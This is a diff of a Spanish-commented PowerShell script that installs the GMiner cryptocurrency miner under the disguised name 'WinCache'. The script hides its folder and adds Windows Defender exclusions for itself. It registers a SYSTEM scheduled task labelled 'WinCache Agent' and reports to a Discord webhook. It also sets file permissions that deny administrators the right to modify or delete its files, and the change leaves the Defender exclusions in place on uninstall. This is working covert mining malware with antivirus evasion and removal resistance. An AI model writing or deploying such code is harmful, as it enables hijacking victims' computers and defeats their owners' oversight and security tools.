@@ -52,35 +52,39 @@ function Send-DiscordWebhook {
 
 function Unprotect-Files {
     param([string]$Path)
-    if (Test-Path $Path) {
+    if ($Path) {
         Write-Host '[*] Removiendo protección de archivos (esto puede tardar unos segundos)...'
-        
-        # Detectar el idioma del sistema para la confirmación de takeown (S en español, Y en inglés)
         $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
         
-        # 1. Tomar posesión forzosa de la carpeta y subcarpetas
-        & takeown.exe /f $Path /r /d $confirm 2>&1 | Out-Null
-        
-        # 2. Otorgar Control Total al SID de Administradores (sobrescribe la denegación)
-        & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)F" /T /C 2>&1 | Out-Null
-        
-        # 3. Eliminar cualquier regla de denegación
-        & icacls.exe $Path /remove:d "*S-1-5-32-544" /T /C 2>&1 | Out-Null
-        
-        # 4. Restaurar la herencia de permisos por defecto
-        & icacls.exe $Path /inheritance:e /T /C 2>&1 | Out-Null
+        # Intentar tomar posesión y devolver permisos a los archivos específicos
+        try {
+            & takeown.exe /f "$Path\WinCache.exe" /a 2>&1 | Out-Null
+            & takeown.exe /f "$Path\WinCache.ps1" /a 2>&1 | Out-Null
+            & icacls.exe "$Path\WinCache.exe" /grant "*S-1-5-32-544:F" /C 2>&1 | Out-Null
+            & icacls.exe "$Path\WinCache.ps1" /grant "*S-1-5-32-544:F" /C 2>&1 | Out-Null
+            & icacls.exe "$Path\WinCache.exe" /remove:d "*S-1-5-32-544" /C 2>&1 | Out-Null
+            & icacls.exe "$Path\WinCache.ps1" /remove:d "*S-1-5-32-544" /C 2>&1 | Out-Null
+        } catch {
+            # Silencioso para evitar que el script muera si la carpeta está muy bloqueada
+        }
     }
 }
 
 function Protect-Files {
     param([string]$Path)
-    if (Test-Path $Path) {
+    if ($Path -and (Test-Path $Path)) {
         Write-Host '[*] Aplicando protección de archivos (Solo SYSTEM puede editar)...'
-        & icacls.exe $Path /inheritance:r /T 2>&1 | Out-Null
-        & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T 2>&1 | Out-Null
-        & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)RX" /T 2>&1 | Out-Null
-        & icacls.exe $Path /deny "*S-1-5-32-544:(OI)(CI)(M,DE)" /T 2>&1 | Out-Null
-        & icacls.exe $Path /grant "*S-1-5-32-545:(OI)(CI)RX" /T 2>&1 | Out-Null
+        
+        $filesToProtect = @("$Path\WinCache.exe", "$Path\WinCache.ps1")
+        foreach ($file in $filesToProtect) {
+            if (Test-Path $file) {
+                # No quitamos la herencia de la carpeta, solo de los archivos
+                & icacls.exe $file /inheritance:r 2>&1 | Out-Null
+                & icacls.exe $file /grant "*S-1-5-18:(F)" 2>&1 | Out-Null
+                & icacls.exe $file /grant "*S-1-5-32-544:(RX)" 2>&1 | Out-Null
+                & icacls.exe $file /deny "*S-1-5-32-544:(M,DE)" 2>&1 | Out-Null
+            }
+        }
         Write-Host '[+] Archivos bloqueados para administradores.'
     }
 }
@@ -149,22 +153,37 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
-# ---------- uninstall -------------------------------------------------------
+# ---------- INICIO DE INSTALACIÓN -------------------------------------------
+# 1. CREAR CARPETA Y EXCLUIR EN DEFENDER PRIMERO
+foreach ($d in @($Root, $LogDir)) { 
+    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } 
+}
+try { 
+    $item = Get-Item $Root -Force
+    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { 
+        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden 
+    } 
+} catch {}
+
+try {
+    $mp = Get-MpPreference -ErrorAction Stop
+    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
+    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
+    Write-Host '[+] Exclusiones de Defender aplicadas.'
+} catch {
+    Write-Warning "No se pudieron aplicar las exclusiones de Defender: $_"
+}
+
+# 2. DESINSTALACIÓN
 if ($Uninstall) {
     Unprotect-Files -Path $Root
     Stop-Safe
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    
-    try {
-        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
-        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
-    } catch {}
-    
     Write-Host '[+] Desinstalado correctamente.'
     return
 }
 
-# ---------- watcher mode ----------------------------------------------------
+# 3. MODO WATCHER
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
     if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }
@@ -243,17 +262,7 @@ if ($Run) {
     exit 0
 }
 
-# ---------- folders & defender ----------------------------------------------
-foreach ($d in @($Root, $LogDir)) { if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } }
-try { $item = Get-Item $Root -Force; if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden } } catch {}
-
-try {
-    $mp = Get-MpPreference -ErrorAction Stop
-    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
-    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
-} catch {}
-
-# ---------- GMiner fetch ----------------------------------------------------
+# 4. DESCARGA DE GMINER
 if (-not (Test-Path $ExePath)) {
     Write-Host '[*] Descargando GMiner...'
     $rel = Invoke-RestMethod -Uri 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest' -Headers @{ 'User-Agent' = 'PowerShell' }
@@ -267,7 +276,7 @@ if (-not (Test-Path $ExePath)) {
     Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# ---------- worker hash -----------------------------------------------------
+# 5. HASH DEL WORKER
 if ([string]::IsNullOrWhiteSpace($Worker)) {
     $sha = [System.Security.Cryptography.SHA256]::Create()
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
@@ -275,8 +284,7 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
     $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
 }
 
-# ---------- install self (Soporte para iwr | iex) ---------------------------
-# Desprotegemos la carpeta temporalmente para poder actualizar el script
+# 6. ACTUALIZACIÓN DEL SCRIPT
 Unprotect-Files -Path $Root
 
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
@@ -290,7 +298,7 @@ if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
 $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
 
-# ---------- safe update & scheduled task ------------------------------------
+# 7. CREACIÓN DE LA TAREA PROGRAMADA
 Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
 Stop-Safe
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
@@ -307,7 +315,7 @@ $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null
 Write-Host "[+] Tarea programada actualizada."
 
-# ---------- launch watcher --------------------------------------------------
+# 8. LANZAR EL WATCHER
 $p = $null
 if ($Foreground) {
     & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
@@ -316,8 +324,7 @@ if ($Foreground) {
     Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
 }
 
-# ---------- apply file protection -------------------------------------------
-# Bloqueamos los archivos al final del proceso para que no puedan ser editados ni borrados
+# 9. APLICAR PROTECCIÓN DE ARCHIVOS AL FINAL
 Protect-Files -Path $Root
 
 if ($DiscordWebhook) {
